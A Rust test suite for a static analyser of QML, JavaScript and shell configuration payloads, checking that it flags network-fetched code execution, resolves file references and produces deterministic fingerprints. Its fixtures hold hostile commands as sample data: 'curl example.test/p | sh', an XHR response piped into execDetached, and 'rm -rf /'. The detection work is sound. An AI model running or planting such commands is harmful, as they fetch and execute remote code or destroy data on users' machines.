use crate::detect::*;
use omasafe_core::bounds::TimeBudget;
use omasafe_report::Report;
use omasafe_report::analysis::AnalysisSection;

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

const EVIL_QML: &str = r#"
import QtQuick
import Quickshell.Io
Item {
    Process { command: ["sh", "-c", "curl example.test/p | sh"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/x")
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
        xhr.send()
    } }
    Loader { source: "./Helper.qml" }
}
"#;

#[test]
fn chained_network_execution_produces_network_finding() {
    let inventory = PayloadInventory {
        entries: vec![entry("Evil.qml", PayloadKind::Qml, EVIL_QML.len())],
        ..Default::default()
    };
    let expected = EVIL_QML.as_bytes().to_vec();
    let (artifacts, inventory) =
        super::rule_contracts::analyze_with(inventory, &[("Evil.qml", &expected)]);
    let findings = artifacts.rendered_findings();
    let rules: Vec<&str> = findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .collect();
    assert!(rules.contains(&PROCESS_RULE), "{rules:?}");
    assert!(rules.contains(&DETACHED_RULE), "{rules:?}");
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    // Every rendered finding carries the full report contract.
    for finding in artifacts.rendered_findings() {
        assert!(!finding.title.is_empty());
        assert!(!finding.explanation.is_empty());
        assert!(!finding.review_guidance.is_empty());
        assert!(finding.line.unwrap_or(0) >= 1);
        assert_eq!(
            finding.confidence.as_deref(),
            if cfg!(feature = "qml-parser") {
                Some("ast-backed")
            } else {
                Some("lexical-fallback")
            }
        );
    }
}

#[test]
fn static_plain_execdetached_stays_capability_only() {
    let source = r#"Item { Component.onCompleted: Quickshell.execDetached("systemctl --user restart foo") }"#;
    let inventory = PayloadInventory {
        entries: vec![entry("Calm.qml", PayloadKind::Qml, source.len())],
        ..Default::default()
    };
    let (artifacts, _) =
        super::rule_contracts::analyze_with(inventory, &[("Calm.qml", source.as_bytes())]);
    assert!(
        !artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == DETACHED_RULE),
        "static plain detached execution is a capability, not a finding"
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "detached-process-execution")
    );
}

#[test]
fn standalone_javascript_is_lexical_with_chain_detection() {
    let source = r#"function run(url) {
    var xhr = new XMLHttpRequest()
    fetch("https://example.test/y")
    xhr.onreadystatechange = function() {
        execDetached(xhr.responseText)
    }
}
"#;
    let inventory = PayloadInventory {
        entries: vec![entry("helper.js", PayloadKind::JavaScript, source.len())],
        ..Default::default()
    };
    let (artifacts, inventory) =
        super::rule_contracts::analyze_with(inventory, &[("helper.js", source.as_bytes())]);
    let findings = artifacts.rendered_findings();
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DETACHED_RULE
                && finding.evidence == "network-response-executed"),
        "{findings:?}"
    );
    assert!(
        !findings
            .iter()
            .any(|finding| finding.rule_id == NETWORK_RULE),
        "lexical co-occurrence alone must stay capability-only"
    );
    assert!(
        findings
            .iter()
            .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
    );
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
}

#[test]
fn invocation_edges_resolve_and_mark_targets() {
    let helper_qml = "Text { text: \"helper\" }\n";
    let script_js = "// referenced helper\n";
    let unreferenced_script = "#!/bin/sh\necho no-one-points-here\n";
    let shell_payload = PayloadEntry {
        kind: PayloadKind::Shell,
        executable: true,
        ..entry(
            "tools/run.sh",
            PayloadKind::Shell,
            unreferenced_script.len(),
        )
    };
    let mut inventory = PayloadInventory {
        entries: vec![
            entry("App.qml", PayloadKind::Qml, EVIL_QML.len()),
            entry("Helper.qml", PayloadKind::Qml, helper_qml.len()),
            entry("scripts/lib.js", PayloadKind::JavaScript, script_js.len()),
            entry("orphan.sh", PayloadKind::Shell, unreferenced_script.len()),
            shell_payload,
        ],
        ..Default::default()
    };
    // App.qml references Helper.qml and scripts/lib.js; nothing references the shells.
    let app_source = format!("{}\nFileView {{ path: \"./scripts/lib.js\" }}\n", EVIL_QML);
    let contents: Vec<(&str, Vec<u8>)> = vec![
        ("App.qml", app_source.into_bytes()),
        ("Helper.qml", helper_qml.as_bytes().to_vec()),
        ("scripts/lib.js", script_js.as_bytes().to_vec()),
        ("orphan.sh", unreferenced_script.as_bytes().to_vec()),
        ("tools/run.sh", unreferenced_script.as_bytes().to_vec()),
    ];
    let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
        .into_iter()
        .map(|(path, bytes)| (path.to_owned(), bytes))
        .collect();
    let budget = TimeBudget::default();
    let artifacts = analyze_inventory(
        &mut inventory,
        &|entry| lookup.get(&entry.relative_path).cloned(),
        &budget,
    );

    let targets: Vec<&str> = artifacts
        .edges
        .iter()
        .map(|edge| edge.target_path.as_str())
        .collect();
    assert!(targets.contains(&"Helper.qml"), "{targets:?}");
    assert!(targets.contains(&"scripts/lib.js"), "{targets:?}");
    let helper_index = inventory
        .entries
        .iter()
        .position(|e| e.relative_path == "Helper.qml")
        .unwrap();
    assert!(inventory.entries[helper_index].invocation_target);
    // Shell payloads keep Unsupported but gain the referenced marker only when pointed at.
    assert!(
        !inventory
            .entries
            .iter()
            .any(|e| e.relative_path == "orphan.sh" && e.invocation_target)
    );
    // Traversal and scheme literals never become edges.
    assert!(
        !targets
            .iter()
            .any(|target| target.contains("..") || target.starts_with('/'))
    );
}

#[test]
fn fingerprint_is_end_to_end_deterministic_and_input_sensitive() {
    let make = |command_literal: &str| {
        let source = format!("Process {{ command: [\"sh\", \"-c\", \"{command_literal}\"] }}");
        let mut inventory = PayloadInventory {
            entries: vec![entry("Main.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let budget = TimeBudget::default();
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.clone().into_bytes()),
            &budget,
        );
        (artifacts, inventory)
    };
    let (first, inv_first) = make("ls -la");
    let (second, inv_second) = make("ls -la");
    let (different, _) = make("rm -rf /");

    let policy = crate::policy_identity();
    let section_one = AnalysisSection::new(
        policy.clone(),
        crate::fingerprint_analysis(&first.results, &first.capabilities),
        inv_first.limitations.clone(),
        first.rendered_findings(),
        first.capabilities.clone(),
        first.edges.clone(),
        parser_metadata(),
        None,
    );
    let section_two = AnalysisSection::new(
        policy.clone(),
        crate::fingerprint_analysis(&second.results, &second.capabilities),
        inv_second.limitations.clone(),
        second.rendered_findings(),
        second.capabilities.clone(),
        second.edges.clone(),
        parser_metadata(),
        None,
    );
    let section_three = AnalysisSection::new(
        policy,
        crate::fingerprint_analysis(&different.results, &different.capabilities),
        Vec::new(),
        different.rendered_findings(),
        different.capabilities.clone(),
        different.edges.clone(),
        parser_metadata(),
        None,
    );

    let render = |section: &AnalysisSection| {
        serde_json::to_vec(&Report::new(
            "omasafe 0.1.2",
            "2026-01-01T00:00:00Z".to_owned(),
            section,
        ))
        .unwrap()
    };
    // Identical source+policy ⇒ identical analysis bytes modulo envelope.
    assert_eq!(
        section_one.analysis_fingerprint,
        section_two.analysis_fingerprint
    );
    assert_ne!(
        section_one.analysis_fingerprint,
        section_three.analysis_fingerprint
    );
    // Golden pins: canonicalization drift must break these loudly.
    #[cfg(feature = "qml-parser")]
    assert_eq!(
        section_one.analysis_fingerprint,
        "35a35a4182be6e66f3804910b20c27d8dfaea83cbceab0e33e6cb21aa59ff12f"
    );
    #[cfg(not(feature = "qml-parser"))]
    assert_eq!(
        section_one.analysis_fingerprint,
        "e208c0be3311a6ec2c695662c99b5554fa708684c806a161bc91e740d46c20f4"
    );
    let _ = render(&section_one);
}

#[test]
fn exhausted_analysis_budget_is_disclosed_not_fatal() {
    let source = "Process { command: [\"sh\", \"-c\", \"x\"] }";
    let mut inventory = PayloadInventory {
        entries: vec![
            entry("A.qml", PayloadKind::Qml, source.len()),
            entry("B.qml", PayloadKind::Qml, source.len()),
        ],
        ..Default::default()
    };
    let expired = TimeBudget::new(std::time::Duration::ZERO);
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &expired,
    );
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation == "analysis_time_budget_exhausted")
    );
}

#[cfg(not(feature = "qml-parser"))]
#[test]
fn fallback_builds_label_qml_conclusions_lexical() {
    let source = "Process { command: [\"sh\", \"-c\", \"curl x | sh\"] }";
    let inventory = PayloadInventory {
        entries: vec![entry("F.qml", PayloadKind::Qml, source.len())],
        ..Default::default()
    };
    let (artifacts, _) =
        super::rule_contracts::analyze_with(inventory, &[("F.qml", source.as_bytes())]);
    assert!(
        artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == PROCESS_RULE)
    );
    assert!(
        artifacts
            .rendered_findings()
            .iter()
            .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
    );
}
